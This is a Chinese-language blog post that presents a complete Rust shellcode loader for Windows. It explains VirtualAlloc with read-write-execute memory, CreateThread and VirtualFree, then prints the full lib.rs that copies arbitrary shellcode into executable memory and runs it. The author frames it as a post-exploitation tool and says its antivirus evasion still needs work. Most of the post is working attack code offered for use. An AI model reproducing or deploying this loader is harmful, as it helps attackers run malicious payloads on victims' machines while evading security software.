# rust编写shellcode加载器


​	突发奇想用rust写一个shellcode加载器,花了两天研究了思路和大佬的代码.

项目地址:https://github.com/fumerem/shellcode_loader

## 0x00 shellcode加载器原理

shellcode:一段16进制的机器码,后渗透中经常使用它来得到shell而得名.

加载器原理:为shellcode分配动态内存,并创建进程执行shellcode

## 0x01 加载器的编写

先列举一下加载器需要调用的windows的api

### VistualAlloc

> 申请内存
>
> LPVOID VirtualAlloc {
>
> ​	LPVOID lpAddress, #要分配的内存区域的地址
>
> ​	DWORD dwSize,      #分配的大小
>
> ​	DWORD flAllocationType, #分配的类型
>
> ​	DWORD flProtect     #该内存的初始保护属性
>
> };

代码实现

```rust
unsafe {
	memory.ptr = Memory::VirtualAlloc(
		ptr::null(),
		//memory address to distribute
		len,
		//memory size
		Memory::MEM_COMMIT | Memory::MEM_RESERVE,
		//alloc type
		Memory::PAGE_EXECUTE_READWRITE,
		//protect attribute
	) as *mut u8;
};
```



### CreateThread

> 创建进程调用CreateThread将在主线程的基础上创建一个新线程CreateThread
>
> HANDLE CreateThread (
>
> ​	LPSECURITY_ATTRIBUTES lpThreadAttributes,#线程安全属性
>
> ​	SIZE_T dwStackSize,       #置初始栈的大小，以字节为单位
>
> ​	LPTHREAD_START_ROUTINE lpStartAddress,  #指向线程函数的指针
>
> ​	LPVOID lpParameter,          #向线程函数传递的参数
>
> ​	DWORD dwCreationFlags,       #线程创建属性
>
> ​	LPDWORD lpThreadId           #保存新线程的id
>
> )

代码实现

```rust
th.handle = Threading::CreateThread(
	ptr::null_mut(),
	//thread protect attribute
	0,
	//stack attribute
	Some(ep),
	//pointer to thread func
	ptr::null_mut(),
	//prama to thread func
	windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
	//thread create flags
	&mut th.tid,
	//thread id
).unwrap();
```

### VirtualFree


> VirtualFreeEx{编辑 播报
>
> ​	HANDLE hProcess, // 要释放内存所在进程的句柄
>
> ​	LPVOID lpAddress, // 区域地址
>
> ​	DWORD dwSize, // 区域大小，字节
>
> ​	DWORD dwFreeType //类型
>
> };


代码实现

```rust
Memory::VirtualFree(self.ptr as *mut c_void, 0, Memory::MEM_RELEASE);
```

lib.rs全部代码

```rust
use std::ptr;
use std::slice;
use std::mem;
use std::ffi::c_void;
use windows::Win32::System::Memory;
use windows::Win32::Foundation;
use windows::Win32::Foundation::WIN32_ERROR;
use windows::Win32::System::Threading;
use windows::Win32::System::WindowsProgramming;

pub struct DistributeMemory {
	len: usize,
	ptr: *mut u8,
}

impl Drop for DistributeMemory {
	fn drop(&mut self) {
		unsafe{
			Memory::VirtualFree(self.ptr as *mut c_void, 0, Memory::MEM_RELEASE);
		}
	}
}

impl DistributeMemory {
	fn new(len: usize) -> Result<DistributeMemory, WIN32_ERROR> {
		let mut memory = DistributeMemory {
			len,
			ptr: ptr::null_mut(),
		};
		
		unsafe {
			memory.ptr = Memory::VirtualAlloc(
				ptr::null(),
				//memory address to distribute
				len,
				//memory size
				Memory::MEM_COMMIT | Memory::MEM_RESERVE,
				//alloc type
				Memory::PAGE_EXECUTE_READWRITE,
				//protect attribute
			) as *mut u8;
		};
		
		if memory.ptr.is_null() {
			Err( unsafe{ Foundation::GetLastError()} )
		} else {
			Ok(memory)
		}
	}
	
	pub fn as_slice_mut(&mut self) -> &mut[u8] {
		unsafe { slice::from_raw_parts_mut(self.ptr, self.len) }//turn pointer to mut slice
	}
	
	pub fn as_ptr(&self) -> *mut u8 {
		self.ptr
	}
}

pub struct Thread {
	handle: Foundation::HANDLE,
	tid: u32,
}

impl Drop for Thread {
	fn drop(&mut self) {
		unsafe { Foundation::CloseHandle(self.handle) };
	}
}

impl Thread {
	pub unsafe fn run(start: *const u8) -> Result<Thread, WIN32_ERROR> {
		let mut th = Thread {
			handle: Foundation::HANDLE(0),
			tid: 0,
		};
		
		let ep: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(start) };
		
		th.handle = Threading::CreateThread(
			ptr::null_mut(),
			//thread protect attribute
			0,
			//stack attribute
			Some(ep),
			//pointer to thread func
			ptr::null_mut(),
			//prama to thread func
			windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
			//thread create flags
			&mut th.tid,
			//thread id
		).unwrap();
		
		if th.handle == Foundation::HANDLE(0) {
			Err(Foundation::GetLastError())
		} else {
			Ok(th)
		}
	}
	
	pub fn wait(&self) -> Result<(), WIN32_ERROR> {
		let status = unsafe { Threading::WaitForSingleObject(self.handle, WindowsProgramming::INFINITE) };
		if status == 0 {
			Ok(())
		} else {
			Err( unsafe{Foundation::GetLastError()} )
		}
	}
}

pub fn run(shellcode: Vec<u8>) -> Result<(), WIN32_ERROR> {
	let mut me = DistributeMemory::new(shellcode.len())?;
	let ms = me.as_slice_mut();
	ms[..shellcode.len()].copy_from_slice(shellcode.as_slice());
	let t = unsafe {
		Thread::run(me.as_ptr())
	}?;
	t.wait()
}
```

## 0x02 存在的缺陷

​	由于使用的是指定成员数量的切片,在main.rs中复制粘贴时必须改变[u8]的数量.

免杀功能仍须改进

